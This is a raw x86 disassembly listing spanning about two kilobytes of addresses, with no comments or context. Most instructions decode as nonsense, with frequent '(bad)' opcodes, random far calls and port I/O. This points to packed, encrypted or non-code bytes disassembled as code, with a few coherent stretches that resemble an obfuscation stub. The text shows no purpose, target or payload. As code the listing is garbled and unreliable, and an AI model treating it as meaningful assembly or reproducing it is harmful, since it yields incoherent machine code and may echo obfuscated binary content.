  4039d4:	(bad)  [edx+0x3f]
  4039d7:	or     DWORD PTR [ecx+0x66b49c26],esi
  4039dd:	mov    edx,0x9243208b
  4039e2:	jl     0x4039a4
  4039e4:	icebp  
  4039e5:	rol    BYTE PTR [ecx+0x33946085],1
  4039eb:	aaa    
  4039ec:	sub    bh,dh
  4039ee:	mov    eax,ds:0xdcf10135
  4039f3:	cli    
  4039f4:	jl     0x403990
  4039f6:	pop    ds
  4039f7:	ror    DWORD PTR [ebp-0x10dd33c5],cl
  4039fd:	data16 mov ch,0xde
  403a00:	and    ecx,DWORD PTR [si+0x7c]
  403a04:	adc    eax,0xec976d19
  403a09:	outs   dx,DWORD PTR ds:[esi]
  403a0a:	xchg   ebx,eax
  403a0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a0c:	fdivr  DWORD PTR [esi]
  403a0e:	test   BYTE PTR [eax-0x48],0xcf
  403a12:	(bad)  
  403a13:	jbe    0x4039c8
  403a15:	lds    eax,FWORD PTR [ebx+0x81ee8f5]
  403a1b:	or     BYTE PTR gs:[ebx],dh
  403a1e:	or     BYTE PTR [eax+0x64f30d6f],ch
  403a24:	or     ebx,DWORD PTR [ecx+0x1aa29f3]
  403a2a:	inc    ecx
  403a2b:	ds jge 0x403a6e
  403a2e:	cmova  edi,edi
  403a31:	(bad)  
  403a32:	cmc    
  403a33:	push   edx
  403a34:	call   0xa29e3893
  403a39:	push   cs
  403a3a:	fdivr  DWORD PTR [edi+0x5a1a3a3d]
  403a40:	shl    bh,1
  403a42:	ror    ebx,0x7
  403a45:	loopne 0x403a45
  403a47:	das    
  403a48:	dec    ecx
  403a49:	mov    BYTE PTR [edi],cl
  403a4b:	lds    esp,FWORD PTR [eax+0x298d5154]
  403a51:	inc    ebx
  403a52:	in     al,dx
  403a53:	xor    cl,BYTE PTR [edx]
  403a55:	sbb    eax,0x87a9c06c
  403a5a:	cmp    BYTE PTR [esi],0xf9
  403a5d:	or     ebx,0x47
  403a60:	pusha  
  403a61:	int    0x53
  403a63:	mov    cs,WORD PTR [ebp+0x51]
  403a66:	xchg   edi,eax
  403a67:	and    eax,0x858b1688
  403a6c:	add    al,0x51
  403a6e:	cmp    al,0x43
  403a70:	and    edx,DWORD PTR [edx+0x4ebc47a0]
  403a76:	adc    eax,0x8cb809ea
  403a7b:	adc    BYTE PTR ds:0x1029ee3f,0x52
  403a82:	push   ds
  403a83:	cdq    
  403a84:	in     al,0x60
  403a86:	mov    ecx,0xfd217bfe
  403a8b:	call   0x650c9a32
  403a90:	adc    ebx,eax
  403a92:	fistp  QWORD PTR [ebx-0x41]
  403a95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a96:	dec    edi
  403a97:	pushf  
  403a98:	(bad)  
  403a9a:	push   ecx
  403a9b:	jns    0x403ac3
  403a9d:	inc    edi
  403a9e:	pop    esi
  403a9f:	repz adc al,0xa7
  403aa2:	icebp  
  403aa3:	jae    0x403b06
  403aa5:	dec    ecx
  403aa6:	ret    
  403aa7:	push   edi
  403aa8:	out    0x45,eax
  403aaa:	out    dx,eax
  403aab:	mov    al,0xed
  403aad:	in     eax,dx
  403aae:	sub    dh,0xf
  403ab1:	fdiv   st(7),st
  403ab3:	adc    dl,BYTE PTR [ebx]
  403ab5:	int    0x2e
  403ab7:	mov    al,0x11
  403ab9:	lahf   
  403aba:	pop    edi
  403abb:	aaa    
  403abc:	nop
  403abd:	mov    ah,0x17
  403abf:	fwait
  403ac0:	ss mov al,0xd2
  403ac3:	sbb    ebp,eax
  403ac5:	or     bh,BYTE PTR [edi]
  403ac7:	retf   0x2438
  403aca:	ret    
  403acb:	add    al,0x57
  403acd:	or     edx,ecx
  403acf:	sub    DWORD PTR [eax-0x2c0c0fa8],esi
  403ad5:	test   al,0x49
  403ad7:	cmp    eax,0xe178c434
  403adc:	mov    ah,0xa5
  403ade:	add    al,0xe8
  403ae0:	sub    dh,bh
  403ae2:	fdivr  st(1),st
  403ae4:	xlat   BYTE PTR ds:[ebx]
  403ae5:	mov    ah,0x25
  403ae7:	outs   dx,BYTE PTR ds:[esi]
  403ae8:	xchg   esi,eax
  403ae9:	repnz dec edx
  403aeb:	(bad)  
  403aec:	cmp    al,ah
  403aee:	iret   
  403aef:	loopne 0x403a7b
  403af1:	inc    ebp
  403af2:	dec    DWORD PTR [edi]
  403af4:	mov    bh,0xd
  403af6:	jmp    0x403ade
  403af8:	inc    edx
  403af9:	add    BYTE PTR [ecx],dl
  403afb:	or     eax,0x42fd76
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e124,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fcfd,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fcf5
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx+0x5e542297],esi
  403b3e:	pop    ss
  403b3f:	lds    ebx,FWORD PTR [esi]
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0xba70707d
  403b48:	imul   ebp,edx,0x78
  403b4b:	call   0xc987:0xa5811923
  403b52:	enter  0xeef2,0x2c
  403b56:	js     0x403b26
  403b58:	sbb    al,0x95
  403b5a:	push   ss
  403b5b:	xchg   DWORD PTR [edx+0x1e],esi
  403b5e:	enter  0x23c9,0x3
  403b62:	lods   eax,DWORD PTR ds:[esi]
  403b63:	adc    eax,DWORD PTR [eax-0x15f5a241]
  403b69:	xchg   ebp,eax
  403b6a:	rcr    BYTE PTR [ecx+0x78],0xf0
  403b6e:	call   0x1b345c78
  403b73:	push   esi
  403b74:	clc    
  403b75:	xchg   edi,eax
  403b76:	pop    ebp
  403b77:	push   ds
  403b78:	mov    bl,ch
  403b7a:	mov    bh,0x3
  403b7c:	sbb    eax,0x8cc0e77
  403b81:	pop    edx
  403b82:	into   
  403b83:	jae    0x403b79
  403b85:	or     ecx,esi
  403b87:	ret    
  403b88:	dec    ecx
  403b89:	daa    
  403b8a:	bound  eax,QWORD PTR [edx]
  403b8c:	mov    ecx,0xaadf1cd8
  403b91:	(bad)
  403b94:	xor    eax,0x14529642
  403b99:	add    BYTE PTR [eax+0x425303b],bl
  403b9f:	pop    edx
  403ba0:	mov    eax,0x8edbae63
  403ba5:	xor    DWORD PTR [edx-0x137cbf5b],esp
  403bab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bac:	js     0x403b6c
  403bae:	adc    bh,BYTE PTR [edx+0x3c]
  403bb1:	add    ch,BYTE PTR [edi*2+0x54b2f377]
  403bb8:	std    
  403bb9:	jns    0x403b99
  403bbb:	mov    cl,0x2a
  403bbd:	and    cl,BYTE PTR [edi-0x3cb38c7e]
  403bc3:	mov    ebp,0xe62d449a
  403bc8:	sbb    ch,cl
  403bca:	loop   0x403b9f
  403bcc:	sub    ch,BYTE PTR [edx-0x2b]
  403bcf:	sub    esi,edx
  403bd1:	push   ds
  403bd2:	popw   ss
  403bd4:	imul   esp,DWORD PTR [eax],0xffffffe3
  403bd7:	push   ebp
  403bd8:	loope  0x403b5b
  403bda:	call   0x9858:0xe096540f
  403be1:	xlat   BYTE PTR ds:[ebx]
  403be2:	mov    ds,WORD PTR [ebx+0x0]
  403be5:	or     ebx,DWORD PTR [ecx+0x6a4e488f]
  403beb:	xchg   DWORD PTR [ebp-0x6f],eax
  403bee:	adc    ebp,ebp
  403bf0:	push   esi
  403bf1:	inc    ebx
  403bf2:	ret    
  403bf3:	add    dl,0x53
  403bf6:	loope  0x403c2e
  403bf8:	push   esi
  403bf9:	adc    al,0x29
  403bfb:	into   
  403bfc:	icebp  
  403bfd:	cmp    ebx,DWORD PTR [ebx]
  403bff:	fnstcw WORD PTR [ebx-0x674d1a2]
  403c05:	bound  ebx,QWORD PTR [ebx+0x70]
  403c08:	bound  edi,QWORD PTR [esi-0x73]
  403c0b:	inc    ebx
  403c0c:	xchg   esp,eax
  403c0d:	add    BYTE PTR [edi+0x70],cl
  403c10:	mov    dl,0x84
  403c12:	cs daa 
  403c14:	fs (bad) 
  403c16:	fisub  WORD PTR [ecx-0x2ba72881]
  403c1c:	(bad)  
  403c1d:	fisub  WORD PTR [ecx]
  403c1f:	lds    ebp,FWORD PTR [ecx-0x3b]
  403c22:	test   DWORD PTR [ebx+ecx*2+0x5fef69d4],ecx
  403c29:	xor    eax,0xd7b17aa7
  403c2e:	mov    cl,0xcf
  403c30:	ss mov ecx,0x9b73033d
  403c36:	es in  al,dx
  403c38:	jne    0x403c87
  403c3a:	jg     0x403c04
  403c3c:	fcom   DWORD PTR [ebp+0x28]
  403c3f:	leave  
  403c40:	imul   ebx,edx,0xffffffac
  403c43:	mov    esi,0x7c44eab9
  403c48:	cmc    
  403c49:	clc    
  403c4a:	enter  0xc98f,0xe7
  403c4e:	(bad)  
  403c4f:	leave  
  403c50:	sbb    bl,BYTE PTR [esi+0x45]
  403c53:	pop    es
  403c54:	pop    es
  403c55:	je     0x403be9
  403c57:	and    BYTE PTR [ebp+0x73df852a],bl
  403c5d:	xchg   WORD PTR [ecx-0x28b9e04e],bp
  403c64:	fbld   TBYTE PTR [edx]
  403c66:	pop    ebp
  403c67:	mul    cl
  403c69:	mov    ebp,0xd921b839
  403c6e:	xchg   ebp,eax
  403c6f:	and    eax,DWORD PTR [ebx-0x3b83cfee]
  403c75:	aas    
  403c76:	xor    ah,BYTE PTR [ebp+0x52f36e1f]
  403c7c:	xor    BYTE PTR [ecx-0x30],ah
  403c7f:	xchg   edx,eax
  403c80:	gs inc edi
  403c82:	mov    ch,0xfb
  403c84:	fwait
  403c85:	pop    eax
  403c86:	push   edx
  403c87:	mov    edx,0xe737f849
  403c8c:	mov    WORD PTR [ebp+0x23],?
  403c8f:	(bad)  
  403c90:	out    dx,al
  403c91:	xlat   BYTE PTR ds:[ebx]
  403c92:	and    ebp,edi
  403c94:	mov    ecx,0x796218c3
  403c99:	mov    esi,0x1cfbb4ee
  403c9e:	jnp    0x403cf9
  403ca0:	leave  
  403ca1:	fimul  DWORD PTR [esi-0x6f]
  403ca4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ca5:	ins    BYTE PTR es:[edi],dx
  403ca6:	pop    ss
  403ca7:	xchg   edx,eax
  403ca8:	cs xor eax,0x1b8cee49
  403cae:	sub    edi,DWORD PTR [ebp-0x9c569f2]
  403cb4:	jle    0x403d35
  403cb6:	fadd   QWORD PTR [ecx]
  403cb8:	jae    0x403d0a
  403cba:	add    al,0xd8
  403cbc:	mov    ecx,0x8dba5c4f
  403cc1:	ja     0x403c68
  403cc3:	and    BYTE PTR [edi],bl
  403cc5:	mov    edi,DWORD PTR [ecx-0x1f]
  403cc8:	cwde   
  403cc9:	gs cmp bh,ah
  403ccc:	add    edi,DWORD PTR [edi]
  403cce:	popf   
  403ccf:	outs   dx,BYTE PTR ds:[esi]
  403cd0:	clc    
  403cd1:	les    esi,FWORD PTR [ecx-0x6]
  403cd4:	(bad)  
  403cd5:	cld    
  403cd6:	sti    
  403cd7:	mov    ch,0x32
  403cd9:	mov    esp,DWORD PTR [ecx+0x15]
  403cdc:	jge    0x403cb2
  403cde:	shufps xmm4,XMMWORD PTR [edx+0x2d],0xf
  403ce3:	lock (bad) 
  403ce5:	jae    0x403d2c
  403ce7:	cdq    
  403ce8:	pop    edx
  403ce9:	cmp    edx,DWORD PTR gs:[edx]
  403cec:	shl    dl,1
  403cee:	cmc    
  403cef:	and    al,ah
  403cf1:	retf   
  403cf2:	lds    ecx,FWORD PTR [ecx]
  403cf4:	aaa    
  403cf5:	mov    eax,ds:0x9f9aada
  403cfa:	pop    ebp
  403cfb:	pop    ebp
  403cfc:	rol    bl,cl
  403cfe:	test   BYTE PTR [ecx],bl
  403d00:	mov    ch,0xba
  403d02:	fnstcw WORD PTR [esp+esi*4+0x2]
  403d06:	xchg   edx,eax
  403d07:	adc    eax,0x1837dbba
  403d0c:	sub    al,0xb5
  403d0e:	push   ss
  403d0f:	fiadd  DWORD PTR [edi-0x2d]
  403d12:	outs   dx,DWORD PTR ds:[esi]
  403d13:	inc    eax
  403d14:	mov    bl,0x2f
  403d16:	cwde   
  403d17:	xchg   edi,eax
  403d18:	xchg   ecx,eax
  403d19:	shl    DWORD PTR [ecx-0x3f],1
  403d1c:	outs   dx,BYTE PTR ds:[esi]
  403d1d:	xor    edx,ebx
  403d1f:	jle    0x403cfa
  403d21:	sbb    al,0x3
  403d23:	xor    ch,BYTE PTR [eax-0xc963a3a]
  403d29:	jne    0x403d92
  403d2b:	pop    eax
  403d2c:	sub    al,0x80
  403d2e:	(bad)  
  403d2f:	jne    0x403d67
  403d31:	repz mov dh,0xda
  403d34:	inc    esp
  403d35:	adc    BYTE PTR [edx+0x6815fa32],dl
  403d3b:	push   edx
  403d3c:	inc    ebp
  403d3d:	dec    DWORD PTR [edx]
  403d3f:	fsin   
  403d41:	jl     0x403d6c
  403d43:	ins    DWORD PTR es:[edi],dx
  403d44:	std    
  403d45:	out    0xbd,al
  403d47:	sahf   
  403d48:	mov    ds:0x7f43f95e,al
  403d4d:	ret    0xf58b
  403d50:	jnp    0x403dad
  403d52:	fwait
  403d53:	adc    al,0x4c
  403d55:	sbb    cl,BYTE PTR [edi]
  403d57:	in     al,0x3b
  403d59:	gs mov esi,0x1ad14476
  403d5f:	mov    eax,0xd78363be
  403d64:	fs scas al,BYTE PTR es:[edi]
  403d66:	pushf  
  403d67:	mov    esp,0x7b540e16
  403d6c:	or     al,0xc4
  403d6e:	ds and esp,0xffffffae
  403d72:	xor    BYTE PTR [esi+0xf],0xc5
  403d76:	jb     0x403d3d
  403d78:	jmp    0x403d01
  403d7a:	pop    ebx
  403d7b:	add    edx,ebx
  403d7d:	lds    ebx,FWORD PTR ds:0x19bb4015
  403d83:	or     edi,DWORD PTR [eax+ebx*8+0x55]
  403d87:	sbb    edx,edx
  403d89:	loope  0x403db9
  403d8b:	icebp  
  403d8c:	sbb    edx,DWORD PTR [ebx+0x762a1337]
  403d92:	pop    ebp
  403d93:	and    ebp,DWORD PTR [ecx+ebx*1-0x2433822d]
  403d9a:	mov    bl,0x7c
  403d9c:	rcl    BYTE PTR [esi+0x33],cl
  403d9f:	pusha  
  403da0:	arpl   sp,si
  403da2:	je     0x403de6
  403da4:	in     eax,0x16
  403da6:	lahf   
  403da7:	mov    edx,0x951af31d
  403dac:	cmp    bl,BYTE PTR [ebx+0xba96ac5]
  403db2:	mov    dl,cl
  403db4:	jmp    0x4ab:0x4e2a9f13
  403dbb:	pop    esp
  403dbc:	nop
  403dbd:	xor    eax,esp
  403dbf:	xchg   ebx,eax
  403dc0:	mov    DWORD PTR [ecx+0x1d],edi
  403dc3:	inc    ecx
  403dc4:	scas   eax,DWORD PTR es:[edi]
  403dc5:	push   eax
  403dc6:	jecxz  0x403dd3
  403dc8:	(bad)  
  403dc9:	cmovno edi,ebx
  403dcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403dcd:	sti    
  403dce:	outs   dx,DWORD PTR ds:[esi]
  403dcf:	jae    0x403db8
  403dd1:	mov    ah,0x5a
  403dd3:	sahf   
  403dd4:	add    eax,0x19402129
  403dd9:	clc    
  403dda:	push   es
  403ddb:	or     cl,0xa8
  403dde:	push   cs
  403ddf:	sub    BYTE PTR [edi+ecx*2+0x4f],bl
  403de3:	mov    WORD PTR cs:[edi-0x2c2cea5e],?
  403dea:	adc    dh,BYTE PTR [ecx+eiz*4-0x6eb4f864]
  403df1:	adc    BYTE PTR [esi-0x3ea716de],0xab
  403df8:	ror    BYTE PTR [ecx-0x70aaa50],cl
  403dfe:	mov    eax,ds:0x8c6b36ff
  403e03:	sbb    BYTE PTR ss:[ecx+0x314ad488],dl
  403e0a:	cmp    al,0xc7
  403e0c:	leave  
  403e0d:	mov    dl,BYTE PTR cs:[eax+ebp*1-0x58]
  403e12:	jle    0x403dcd
  403e14:	xor    eax,0xbcd7614
  403e19:	add    BYTE PTR [ecx],dl
  403e1b:	sbb    ecx,DWORD PTR [ebx]
  403e1d:	mov    ah,0x79
  403e1f:	popf   
  403e20:	jle    0x403e51
  403e22:	sti    
  403e23:	push   es
  403e24:	call   0x3db9:0xa557a5c4
  403e2b:	dec    ebx
  403e2c:	pushf  
  403e2d:	not    DWORD PTR gs:[edx]
  403e30:	mov    ebp,0x8ce7d564
  403e35:	loop   0x403e06
  403e37:	punpcklbw mm7,DWORD PTR [edx+ecx*1-0x6c393b73]
  403e3f:	mov    ebx,0x6c96edf4
  403e44:	or     DWORD PTR [esi+edx*1-0x5e],ecx
  403e48:	jmp    0x607befa1
  403e4d:	aas    
  403e4e:	std    
  403e4f:	outs   dx,BYTE PTR ds:[esi]
  403e50:	mov    cl,0x9f
  403e52:	mov    dh,0x35
  403e54:	aas    
  403e55:	xor    edx,DWORD PTR [ebx]
  403e57:	xchg   esp,eax
  403e58:	sub    cl,BYTE PTR [esi+0x6f]
  403e5b:	xor    BYTE PTR [eax],cl
  403e5d:	adc    eax,ecx
  403e5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e60:	sub    DWORD PTR [ecx+0x796af3fe],0xba937fbb
  403e6a:	sbb    DWORD PTR [ecx-0x20ebd4ef],ebx
  403e70:	or     BYTE PTR [edx],ch
  403e72:	popa   
  403e73:	arpl   WORD PTR [edi],ax
  403e75:	(bad)  
  403e76:	mov    ch,0xbd
  403e78:	push   0x8fe6fe56
  403e7d:	sub    eax,0xcf188326
  403e82:	push   ebp
  403e83:	pusha  
  403e84:	clc    
  403e85:	shr    ebp,cl
  403e87:	mov    dl,0xf0
  403e89:	push   0xffffffc7
  403e8b:	inc    ebp
  403e8c:	lock xor BYTE PTR [ebp+0x458bf89c],al
  403e93:	clc    
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e11c
  403ea2:	adc    DWORD PTR ds:0x42e70f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fd72,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fd05,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e6ef,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0x423b1c35
  403eec:	cmp    al,0x6c
  403eee:	sbb    BYTE PTR [ebx],0x70
  403ef1:	jo     0x403f30
  403ef3:	jge    0x403f65
  403ef5:	jo     0x403eda
  403ef7:	sti    
  403ef8:	xchg   ebp,eax
  403ef9:	ror    al,0x6a
  403efc:	test   BYTE PTR [edx],dh
  403efe:	ja     0x403eca
  403f00:	xor    eax,0x2b8d8f4a
  403f05:	mov    bl,0x9d
  403f08:	ds icebp 
  403f0a:	arpl   cx,bp
  403f0c:	(bad)  
  403f0d:	mov    al,ds:0x9558e26a
  403f12:	fidivr DWORD PTR [ebx]
  403f14:	test   DWORD PTR [ebp+0x5c],ebp
  403f17:	mov    eax,ds:0xe943ea4c
  403f1c:	pop    ebx
  403f1d:	jnp    0x403f60
  403f1f:	add    ebx,DWORD PTR [esi-0x56f7a2b4]
  403f25:	jg     0x403f2c
  403f27:	xor    ebx,edi
  403f29:	test   eax,0xf3ccec94
  403f2e:	frstor [eax]
  403f30:	ret    0x555a
  403f33:	jae    0x403ee2
  403f35:	mov    ch,0xe6
  403f37:	sbb    esp,DWORD PTR [ebx+ecx*8]
  403f3a:	fld    TBYTE PTR [edx-0x16869ecf]
  403f40:	pop    ebx
  403f41:	jl     0x403faa
  403f43:	cmp    eax,0xa22aab59
  403f48:	fisttp DWORD PTR [ecx]
  403f4a:	push   esp
  403f4b:	xor    ch,BYTE PTR [edx+0x7]
  403f4e:	cmp    eax,0xdba46443
  403f53:	inc    esp
  403f54:	in     al,dx
  403f55:	cmp    DWORD PTR [ebp+0x75d4a7e7],esi
  403f5b:	retf   0xa83c
  403f5e:	sub    dl,cl
  403f60:	fsub   DWORD PTR [eax-0x10df9ee1]
  403f66:	adc    al,0x8a
  403f68:	sub    BYTE PTR [esi+0x5623320],bl
  403f6e:	mov    esp,0x69dc93c2
  403f73:	dec    ebp
  403f74:	dec    edx
  403f75:	adc    esp,DWORD PTR [ecx+0x32c46a2d]
  403f7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f7c:	ret    0x1192
  403f7f:	sti    
  403f80:	les    edx,FWORD PTR [ebx-0x5f]
  403f83:	mov    al,ds:0x29970db
  403f88:	jecxz  0x403fd2
  403f8a:	retf   
  403f8b:	mov    dh,0xf2
  403f8d:	retf   
  403f8e:	jmp    0x403f47
  403f90:	gs test al,0xb1
  403f93:	jmp    0x403f31
  403f95:	(bad)  
  403f96:	out    dx,al
  403f97:	xchg   ecx,eax
  403f98:	mov    dl,0xfb
  403f9a:	ror    eax,cl
  403f9c:	jno    0x403f2f
  403f9e:	imul   edi,DWORD PTR [ebp-0x571d5aa5],0x5187993b
  403fa8:	in     eax,dx
  403fa9:	movhps xmm2,QWORD PTR [eax+0x618e8460]
  403fb0:	lock sbb BYTE PTR [esi],0xb1
  403fb4:	and    esi,DWORD PTR [ecx+0x42]
  403fb7:	leave  
  403fb8:	sbb    al,0x87
  403fba:	jecxz  0x403f49
  403fbc:	adc    al,0x3b
  403fbe:	aam    0xd7
  403fc0:	pop    ss
  403fc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fc2:	js     0x403ff0
  403fc4:	jne    0x403f6c
  403fc6:	jne    0x403fe8
  403fc8:	cli    
  403fc9:	mov    ecx,0x583eace9
  403fce:	mov    dl,0xe1
  403fd0:	mov    eax,0x664bf2b
  403fd5:	cmp    al,0x34
  403fd7:	sti    
  403fd8:	ins    BYTE PTR es:[edi],dx
  403fd9:	test   BYTE PTR [ebx],bl
  403fdb:	rcr    DWORD PTR [edi+0x6d4a947a],cl
  403fe1:	push   esi
  403fe2:	cmp    bh,BYTE PTR [esi+0x45]
  403fe5:	cmp    al,0x9d
  403fe7:	jg     0x403fa2
  403fe9:	add    BYTE PTR [eax+edx*2-0x602c5213],al
  403ff0:	std    
  403ff1:	adc    al,0xac
  403ff3:	xchg   ecx,eax
  403ff4:	shl    bl,cl
  403ff6:	or     ebx,DWORD PTR [esi]
  403ff8:	push   ecx
  403ff9:	std    
  403ffa:	inc    esp
  403ffb:	mov    ah,0x95
  403ffd:	dec    esi
  403ffe:	sub    cl,BYTE PTR [eax]
  404000:	imul   edi,DWORD PTR [edx-0x80],0xffffffe1
  404004:	sar    DWORD PTR [edi+0x4a32fc69],1
  40400a:	sbb    ah,BYTE PTR [edx]
  40400c:	mov    ebp,0x8bf4f36e
  404011:	addr16 xor eax,edx
  404014:	sbb    eax,0xc5ad454d
  404019:	sbb    esi,DWORD PTR [edx-0x5f]
  40401c:	sbb    esi,DWORD PTR [eax]
  40401e:	mov    ch,0x45
  404020:	in     eax,dx
  404021:	push   esi
  404022:	into   
  404023:	mov    ebx,0x4a7cf503
  404028:	lock push esi
  40402a:	sbb    ecx,DWORD PTR [ecx+0x4fa82779]
  404030:	sub    cl,BYTE PTR [edx-0x6c]
  404033:	(bad)  
  404035:	ins    DWORD PTR es:[edi],dx
  404036:	xchg   esi,eax
  404037:	lods   al,BYTE PTR ds:[esi]
  404038:	cmp    edx,esi
  40403a:	rcr    BYTE PTR [eax],0x72
  40403d:	stc    
  40403e:	mov    ebx,?
  404040:	xchg   DWORD PTR [eax-0x27017a00],edi
  404046:	xchg   edx,eax
  404047:	sub    eax,0x25
  40404a:	jnp    0x4040a5
  40404c:	mov    eax,0x20ed60f2
  404051:	adc    eax,0xb4aae4d3
  404056:	jb     0x404069
  404058:	mov    es,eax
  40405a:	in     al,0x65
  40405c:	dec    ebp
  40405d:	fisttp WORD PTR ds:0xac3ce83
  404064:	pop    ebp
  404065:	pop    eax
  404066:	or     eax,0xe86aa151
  40406b:	xchg   esi,eax
  40406c:	nop
  40406d:	pusha  
  40406e:	(bad)  
  40406f:	scas   eax,DWORD PTR es:[edi]
  404070:	pop    eax
  404071:	xchg   edi,eax
  404072:	xor    al,0x29
  404074:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404075:	cmp    esi,esi
  404077:	iret   
  404078:	leave  
  404079:	gs inc eax
  40407b:	or     edi,edx
  40407d:	shr    BYTE PTR [ebx-0x293c7357],1
  404083:	xchg   ebp,eax
  404084:	sub    al,0x31
  404086:	inc    edx
  404087:	aas    
  404088:	sar    DWORD PTR [ebp-0x63],0x9f
  40408c:	mov    al,ds:0xe39d99d1
  404091:	push   eax
  404092:	je     0x40410b
  404094:	push   eax
  404095:	pop    edi
  404096:	jne    0x404028
  404098:	mov    dh,0x13
  40409a:	imul   ebp,DWORD PTR [eax],0x58
  40409d:	or     ah,BYTE PTR [esi+0x40]
  4040a0:	call   0xc793123e
  4040a5:	ds adc eax,0x8981f36c
  4040ab:	and    al,0xd0
  4040ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040ae:	(bad)  
  4040b0:	sbb    BYTE PTR gs:[ecx],dl
  4040b3:	test   BYTE PTR [ebx+0xfd87158],bl
  4040b9:	dec    esp
  4040ba:	push   0x31168306
  4040bf:	jae    0x40405e
  4040c1:	(bad)  
  4040c2:	sbb    BYTE PTR [ebp-0x36],ch
  4040c5:	and    eax,0xa2d5dad7
  4040ca:	adc    bl,0x90
  4040cd:	out    0xc3,al
  4040cf:	das    
  4040d0:	std    
  4040d1:	jno    0x404095
  4040d3:	hlt    
  4040d4:	mov    ch,0x4a
  4040d6:	imul   ecx,DWORD PTR [ebx-0x4e6454fe],0x5
  4040dd:	in     eax,dx
  4040de:	mov    esi,0x8e85b871
  4040e3:	das    
  4040e4:	pusha  
  4040e5:	dec    edx
  4040e6:	inc    esi
  4040e7:	adc    eax,0x38bd42f1
  4040ec:	mov    ah,0xc
  4040ee:	iret   
  4040ef:	sbb    eax,esi
  4040f1:	xor    eax,0xdd1e905b
  4040f6:	pop    esp
  4040f7:	stos   BYTE PTR es:[edi],al
  4040f8:	int3   
  4040f9:	mov    WORD PTR [ecx],gs
  4040fb:	int    0xd1
  4040fd:	pinsrw mm4,ebx,0x43
  404101:	push   esi
  404102:	into   
  404103:	pushf  
  404104:	or     eax,0x7fefe2c9
  404109:	imul   eax,edi,0xfffffff3
  40410c:	ss or  eax,0xc9a0317b
  404112:	outs   dx,BYTE PTR ds:[esi]
  404113:	dec    ebx
  404114:	into   
  404115:	or     DWORD PTR [ecx],0xde326e0d
  40411b:	and    bh,cl
  40411d:	sbb    DWORD PTR [edx-0x17],edx
  404120:	jo     0x404142
  404122:	aam    0xe8
  404124:	push   0xb6a532e1
  404129:	outs   dx,BYTE PTR ds:[esi]
  40412a:	(bad)  
  40412b:	pushf  
  40412c:	leave  
  40412d:	adc    BYTE PTR [ecx-0x64a20c30],cl
  404133:	int3   
  404134:	dec    BYTE PTR [ebx-0x46]
  404137:	add    al,ch
  404139:	inc    esp
  40413a:	repz add BYTE PTR [esi-0x7895f68d],bl
  404141:	mov    WORD PTR [esi],?
  404143:	sbb    cl,BYTE PTR [eax]
  404145:	idiv   DWORD PTR [esi+0x63]
  404148:	fiadd  WORD PTR [ecx+0xb1b79b9]
  40414e:	retf   
  40414f:	and    eax,0x4188f337
  404154:	ret    
  404155:	inc    ecx
  404156:	dec    edi
  404157:	jnp    0x4040f9
  404159:	in     eax,0xf8
  40415b:	ins    BYTE PTR es:[edi],dx
  40415c:	gs prefetch (bad)
  40415e:	or     eax,0x132101e7
  404163:	pushf  
  404164:	pop    ss
  404165:	lock add eax,0x350f2d5c
  40416b:	aaa    
  40416c:	dec    edi
  40416d:	xor    eax,0x1429c8e4
  404172:	sub    edi,DWORD PTR [esi+0x67e0058c]
  404178:	out    dx,al
  404179:	ret    
  40417a:	mov    edi,0x4e80fd8f
  40417f:	cwde   
  404180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404181:	sahf   
  404182:	inc    esp
  404183:	daa    
  404184:	sbb    ebx,DWORD PTR [esi+0x111d910e]
  40418a:	ret    0x73e4
  40418d:	jmp    0x40416b
  40418f:	cdq    
  404190:	clc    
  404191:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404192:	cli    
  404193:	push   ds
  404194:	dec    ecx
  404195:	in     al,0x6a
  404197:	pop    es
  404198:	jecxz  0x404126
  40419a:	xchg   esi,esi
  40419c:	push   eax
  40419d:	cwde   
  40419e:	xor    BYTE PTR [eax+0x71939c83],0x71
  4041a5:	loope  0x40415d
  4041a7:	push   ebp
  4041a8:	sbb    eax,0x970516ba
  4041ad:	adc    eax,DWORD PTR [edx]
  4041af:	inc    esi
  4041b0:	jmp    0xa3b5:0x83ad089d
  4041b7:	push   0x177a99d4
  4041bc:	shl    DWORD PTR [edx+edi*1],0x65
  4041c0:	not    BYTE PTR [eax+esi*4]
  4041c3:	imul   ecx,DWORD PTR [esp+ecx*4],0xffffff9c
  4041c7:	scas   eax,DWORD PTR es:[edi]
  4041c8:	cwde   
  4041c9:	ja     0x404244
  4041cb:	cli    
  4041cc:	out    dx,al
  4041cd:	ja     0x404203
